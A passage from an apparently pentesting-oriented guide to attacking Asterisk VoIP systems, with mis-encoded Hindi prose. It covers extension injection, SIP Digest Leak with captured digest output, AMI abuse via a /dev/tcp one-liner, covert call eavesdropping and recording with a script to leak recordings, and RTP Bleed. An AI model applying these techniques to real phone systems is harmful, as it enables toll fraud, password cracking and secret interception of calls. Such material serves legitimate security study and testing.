рдЗрдирдкреБрдЯ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреЙрд▓ рдлрд╝реНрд▓реЛ рдХреЛ рдХрдВрдЯреНрд░реЛрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
рдкрд┐рдЫрд▓рд╛ рдЙрджрд╛рд╣рд░рдг рдПрдХ рдРрд╕рд╛ рд╣реИ рдЬрд╣рд╛рдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ рдПрдХ рд╡рд┐рднрд╛рдЧ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **1 рджрдмрд╛рдПрдВ**, рджреВрд╕рд░реЗ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **2 рджрдмрд╛рдПрдВ**, рдпрд╛ рдЕрдЧрд░ рдЙрд╕реЗ рдкрддрд╛ рд╣реИ рддреЛ **рдкреВрд░рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рджрдмрд╛рдПрдВред\
рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрддрддрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣рд╛рдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд▓рдВрдмрд╛рдИ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ 5 рд╕реЗрдХрдВрдб рдХреА рдЯрд╛рдЗрдордЖрдЙрдЯ рдХреЗ рдмрд╛рдж рднреА рдкреВрд░рд╛ рдирдВрдмрд░ рджрд░реНрдЬ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред**

### рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЗрдВрдЬреЗрдХреНрд╢рди

рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬреИрд╕реЗ:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
рдЬрд╣рд╛рдВ **`${EXTEN}`** **рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рд╣реИ рдЬрд┐рд╕реЗ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬрдм **рдПрдХреНрд╕рдЯреЗрдВрд╢рди 101 рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛** рддреЛ рдпрд╣ рд╣реЛрдЧрд╛:
```scss
exten => 101,1,Dial(SIP/101)
```
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ **`${EXTEN}`** рдХреЛ **рдирдВрдмрд░ рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдФрд░ рднреА рдХреБрдЫ** (рдкреБрд░рд╛рдиреЗ Asterisk рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреА рддрд░рд╣) рджрд░реНрдЬ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ **`101&SIP123123123`** рджрд░реНрдЬ рдХрд░рдХреЗ рдлреЛрди рдирдВрдмрд░ 123123123 рдкрд░ рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдФрд░ рдпрд╣реА рдкрд░рд┐рдгрд╛рдо рд╣реЛрдЧрд╛:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
рдЗрд╕рд▓рд┐рдП, **`101`** рдФрд░ **`123123123`** рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдкрд░ рдХреЙрд▓ рднреЗрдЬреА рдЬрд╛рдПрдЧреА рдФрд░ рдХреЗрд╡рд▓ рдкрд╣рд▓реЗ рд╡рд╛рд▓реЗ рдХреЛ рдХреЙрд▓ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрдЧреА... рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдРрд╕реЗ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗ рдЬреЛ рдХрд┐рд╕реА рднреА рдорд┐рд▓рд╛рди рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рдХрд┐ рдХрд┐рд╕реА рднреА рдорд┐рд▓рд╛рди рдХреЗ рджреМрд░рд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛ рд▓реЗрдХрд┐рди рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ, рддреЛ рд╡рд╣ рдХреЗрд╡рд▓ рдЪрдпрдирд┐рдд рдирдВрдмрд░ рдкрд░ рдХреЙрд▓ **рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

## SIPDigestLeak

SIP Digest Leak рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реНрдмрд▓рддрд╛ рд╣реИ рдЬреЛ рдмрд╣реБрдд рд╕рд╛рд░реЗ SIP рдлреЛрдиреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИ, рдЬрд┐рдирдореЗрдВ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдФрд░ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдЖрдИрдкреА рдлреЛрди рдФрд░ рдлреЛрди рдПрдбрд╛рдкреНрдЯрд░ (VoIP рд╕реЗ рдПрдирд╛рд▓реЙрдЧ) рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдпрд╣ рджреБрд░реНрдмрд▓рддрд╛ **Digest рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рд░рд┐рд╕рд╛рд╡** рдХреЛ рд╕рдВрджреЗрд╢ рд╕реЗ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рдЧрдгрдирд╛ рдХреА рдЬрд╛рддреА рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж рдПрдХ **рдСрдлрд▓рд╛рдЗрди рдкрд╛рд╕рд╡рд░реНрдб рд╣рдорд▓рд╛ рд╕рдВрднрд╡** рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЪреИрд▓реЗрдВрдЬ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЕрдзрд┐рдХрд╛рдВрд╢ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢, рдЕрднреА рддрдХ рдЗрд╕ рд╡рд┐рд╖рдп рдкрд░ рдХреЛрдИ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИред

1. рдПрдХ рдЖрдИрдкреА рдлреЛрди (рд╢рд┐рдХрд╛рд░) рдкреЛрд░реНрдЯ 5060 рдкрд░ рд╕реБрди рд░рд╣рд╛ рд╣реИ, рдлреЛрди рдХреЙрд▓ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд░рд╣рд╛ рд╣реИ
2. рд╣рдорд▓рд╛рд╡рд░ рдиреЗ рдЖрдИрдкреА рдлреЛрди рдХреЛ INVITE рднреЗрдЬрд╛ рд╣реИ
3. рд╢рд┐рдХрд╛рд░ рдлреЛрди рдмрдЬрдирд╛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХреЛрдИ рдЙрддреНрддрд░ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рджреВрд╕рд░реЗ рдЫреЛрд░ рдкрд░ рдХреЛрдИ рдлреЛрди рдирд╣реАрдВ рдЙрдард╛рддрд╛ рд╣реИ)
4. рдЬрдм рдлреЛрди рдХрд╛рдЯ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рд╢рд┐рдХрд╛рд░ рдлреЛрди рд╣рдорд▓рд╛рд╡рд░ рдХреЛ BYE рднреЗрдЬрддрд╛ рд╣реИ**
5. **рд╣рдорд▓рд╛рд╡рд░ рдПрдХ 407 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ** рдЬреЛ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛ рд╣реИ** рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреБрдиреМрддреА рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ
6. **рд╢рд┐рдХрд╛рд░ рдлреЛрди рдПрдХ рджреВрд╕рд░реЗ BYE рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреБрдиреМрддреА рдХрд╛ рдЙрддреНрддрд░ рджреЗрддрд╛ рд╣реИ**
7. **рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ рдЕрдкрдиреА рд╕реНрдерд╛рдиреАрдп рдорд╢реАрди рдкрд░ рдЪреБрдиреМрддреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрд░ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рд╣рдорд▓рд╛** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ

* [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗ **sipdigestleak.py** : SipDigestLeak рдЗрд╕ рджреБрд░реНрдмрд▓рддрд╛ рдХрд╛ рд╢реЛрдз рдХрд░рддрд╛ рд╣реИред
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### рдХреНрд▓рд┐рдХ2рдХреЙрд▓

рдХреНрд▓рд┐рдХ2рдХреЙрд▓ рдПрдХ **рд╡реЗрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ (рдЬреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рдЙрддреНрдкрд╛рдж рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦ рд╕рдХрддрд╛ рд╣реИ) рдЙрд╕рдХрд╛ **рдЯреЗрд▓реАрдлреЛрди рдирдВрдмрд░ рджрд░реНрдЬ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕реЗ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдлрд┐рд░ рдПрдХ рд╡реНрдпрд╛рдкрд╛рд░рд┐рдХ рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рдЬрдм рд╡рд╣ **рдлреЛрди рдЙрдард╛рдПрдЧрд╛**, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдПрдЬреЗрдВрдЯ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп Asterisk рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╣реИ:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* рдкрд┐рдЫрд▓реА рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХрд┐рд╕реА рднреА IP рдкрддреЗ рдХреЛ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд░рд╣реА рд╣реИ (рдЕрдЧрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЬреНрдЮрд╛рдд рд╣реЛ рддреЛ)ред
* рдкрд┐рдЫрд▓реЗ рддрд░рд╣, рдХреЙрд▓ рдХреЛ рдЖрдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ рдФрд░ рдХреЗрд╡рд▓ рд▓рд┐рдЦрдиреЗ рдореЗрдВ **originate** рдЕрдиреБрдорддрд┐ рд╣реА рдЪрд╛рд╣рд┐рдПред

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде, рдХрд┐рд╕реА рднреА IP рдкрддрд╛ рд╡рд╛рд▓рд╛ рд╡реНрдпрдХреНрддрд┐ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдирддреЗ рд╣реБрдП рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдорд╛рдВрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред**

### **рдИрд╡реНрд╕рдбреНрд░реЙрдкрд┐рдВрдЧ**

рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдореЗрдВ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк **`ChanSpy`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ **рдореЙрдирд┐рдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕рдЯреЗрдВрд╢рди(рдУрдВ) рдХреА рдШреЛрд╖рдгрд╛** (рдпрд╛ рд╕рднреА) рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЬреЛ рдмрд╛рддрдЪреАрдд рд╣реЛ рд░рд╣реА рд╣реИрдВ, рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕ рдХрдорд╛рдВрдб рдХреЛ рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рд╕реМрдВрдкрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **`exten => 333,1,ChanSpy('all',qb)`** рдЗрд╕рдХрд╛ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдк **рдПрдХреНрд╕рдЯреЗрдВрд╢рди 333** рдХреЛ **рдХреЙрд▓** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ **рд╕рднреА** рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ **рдореЙрдирд┐рдЯрд░** рдХрд░реЗрдЧрд╛, рдирдИ рдмрд╛рддрдЪреАрдд рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реА (**`b`**) рд╢рд╛рдВрдд рдореЛрдб (**`q`**) рдореЗрдВ **рд╕реБрдирдирд╛ рд╢реБрд░реВ** рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╣рдореЗрдВ рдЗрд╕рдореЗрдВ рд╕рдВрд╡рд╛рдж рдореЗрдВ рдмрд╛рддрдЪреАрдд рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдирд╣реАрдВ рдХрд░рдирд╛ рд╣реИред рдЖрдк рдПрдХ рдмрд╛рддрдЪреАрдд рд╣реЛ рд░рд╣реА рд╣реЛ рд╕рдХрддреА рд╣реИ рд╕реЗ рджреВрд╕рд░реА рдмрд╛рддрдЪреАрдд рд╣реЛ рд░рд╣реА рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП **`*`** рджрдмрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдирдВрдмрд░ рдХреЛ рдЪрд┐рд╣реНрдирд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдмрд╛рддрдЪреАрддреЛрдВ рдХреЛ рд╕реБрдирдиреЗ рдХреА рдмрдЬрд╛рдп, рдЖрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ **рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд░рд┐рдХреЙрд░реНрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

рдХреЙрд▓реНрд╕ **`/tmp`** рдореЗрдВ рд╕рд╣реЗрдЬреА рдЬрд╛рдПрдВрдЧреАред

рдЖрдк рдпрд╣рд╛рдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЬрдм рдпрд╣ рдмрдВрдж рд╣реЛ рдЬрд╛рдПрдЧрд╛, рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЪрд▓рд╛рдП рдЬреЛ рдХреЙрд▓ рдХреЛ рд▓реАрдХ рдХрд░реЗрдЧрд╛ред
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed** рдПрдХ рдореБрдЦреНрдп рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рд╣реИ рдЬреЛ Asterisk рдЖрдзрд╛рд░рд┐рдд VoIP рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИ (2017 рдореЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХреА рдЧрдИ рд╣реИ)ред рдЗрд╕ рд╕рдВрдХрдЯ рдХреЗ рдХрд╛рд░рдг **RTP (рд░рд┐рдпрд▓ рдЯрд╛рдЗрдо рдкреНрд░реЛрдЯреЛрдХреЙрд▓) рдЯреНрд░реИрдлрд┐рдХ**, рдЬреЛ VoIP рд╡рд╛рд░реНрддрд╛рдУрдВ рдХреЛ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ, рдХрд┐рд╕реА рднреА рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдореМрдЬреВрдж рд╡реНрдпрдХреНрддрд┐ рджреНрд╡рд╛рд░рд╛ **рдЕрд╡рд░реБрджреНрдз рдФрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ RTP рдЯреНрд░реИрдлрд┐рдХ NAT (рдиреЗрдЯрд╡рд░реНрдХ рдкрддрд╛ рдЕрдиреБрд╡рд╛рджрди) рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рддреЗ рд╕рдордп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИред

RTP рдкреНрд░реЙрдХреНрд╕реА рдЖрдорддреМрд░ рдкрд░ рджреЛ рдпрд╛ рдЕрдзрд┐рдХ рдкрдХреНрд╖реЛрдВ рдХреЗ рдмреАрдЪ RTP рд╕реНрдЯреНрд░реАрдо рдХреЛ рдкреНрд░реЙрдХреНрд╕реА рдХрд░рдХреЗ RTC рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ NAT рд╕реАрдорд╛рдУрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВред рдЬрдм NAT рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ RTP рдкреНрд░реЙрдХреНрд╕реА рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдЖрдорддреМрд░ рдкрд░ рд╕рдВрдХреЗрддреАрдХрд╛ (рдЬреИрд╕реЗ SIP) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЧрдИ RTP IP рдФрд░ рдкреЛрд░реНрдЯ рдЬрд╛рдирдХрд╛рд░реА рдкрд░ рднрд░реЛрд╕рд╛ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдХрдИ RTP рдкреНрд░реЙрдХреНрд╕реА рдиреЗ рдПрдХ рдРрд╕реА рддрдВрддреНрд░рд┐рдХрд╛ рдХреЛ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдРрд╕реА IP рдФрд░ рдкреЛрд░реНрдЯ рдЬреЛрдбрд╝реА рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реАрдЦреА рдЬрд╛рддреА рд╣реИред рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдЗрдирдХрдорд┐рдВрдЧ RTP рдЯреНрд░реИрдлрд┐рдХ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рдЗрдирдХрдорд┐рдВрдЧ RTP рдЯреНрд░реИрдлрд┐рдХ рдХреЗ рд╕реНрд░реЛрдд IP рдФрд░ рдкреЛрд░реНрдЯ рдХреЛ рдЙрддреНрддрд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрддреНрддрд░рджрд╛рддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рддрдВрддреНрд░ рдХреЛ "рд╕реАрдЦрдиреЗ рдХреА рдореЛрдб" рдХрд╣рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП **рд╣рдорд▓рд╛рд╡рд░** RTP рдкреНрд░реЙрдХреНрд╕реА рдХреЛ **RTP рдЯреНрд░реИрдлрд┐рдХ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдПрдХ рдЪрд▓ рд░рд╣реА RTP рд╕реНрдЯреНрд░реАрдо рдХреЗ рдХреЙрд▓рд░ рдпрд╛ рдХреЙрд▓реА рдХреЗ рд▓рд┐рдП рдорд╛рдВрдЧреА рдЧрдИ рдкреНрд░реЙрдХреНрд╕реА RTP рдЯреНрд░реИрдлрд┐рдХ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реНрдмрд▓рддрд╛ рдХреЛ RTP Bleed рдХрд╣рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд RTP рдореАрдбрд┐рдпрд╛ рд╕реНрдЯреНрд░реАрдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

RTP рдкреНрд░реЙрдХреНрд╕реА рдФрд░ RTP рд╕реНрдЯреИрдХ рдХрд╛ рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рд╡реНрдпрд╡рд╣рд╛рд░ рд╣реИ рдХрд┐ рдХрднреА-рдХрднреА, **рдпрджреНрдпрдкрд┐ RTP Bleed рдХреЗ рдкреНрд░рддрд┐ рджреБрд░реНрдмрд▓ рдирд╣реАрдВ рд╣реЛрдВ**, рд╡реЗ **рдХрд┐рд╕реА рднреА рд╕реНрд░реЛрдд рд╕реЗ RTP рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░, рдЖрдЧреЗ рднреЗрдЬреЗрдВ рдФрд░/рдпрд╛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░реЗрдВрдЧреЗ**ред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ RTP рдкреИрдХреЗрдЯреНрд╕ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рд╡реИрдз рд╡рд╛рд▓реЗ рдХреЗ рдмрдЬрд╛рдп рдЕрд╡реИрдз рдореАрдбрд┐рдпрд╛ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рд╣рдо рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ RTP рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╣рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рд╕реЗ рдореМрдЬреВрджрд╛ RTP рд╕реНрдЯреНрд░реАрдо рдореЗрдВ рдЕрд╡реИрдз RTP рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ 